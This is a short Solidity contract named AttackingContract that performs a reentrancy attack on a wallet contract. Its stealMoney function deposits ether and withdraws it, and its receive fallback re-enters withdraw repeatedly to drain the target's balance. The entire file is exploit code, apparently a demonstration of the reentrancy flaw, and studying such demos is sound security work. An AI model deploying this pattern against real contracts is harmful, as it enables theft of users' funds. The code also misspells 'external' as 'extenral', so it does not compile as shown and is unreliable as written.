pragma solidity 0.8.23;

import {IWallet} from "./IWallet.sol";

contract AttackingContract {
  IWallet private wallet;

  constructor(address _address) {
    wallet = IWallet(_address);
  }

  receive() extenral payable {
    if (address(wallet).balance >= wallet.balances(address(this))) {
      wallet.withdraw();
    }
  }

  function stealMoney() external payable {
    wallet.deposit{value: msg.value}();
    wallet.withdraw();
  }
}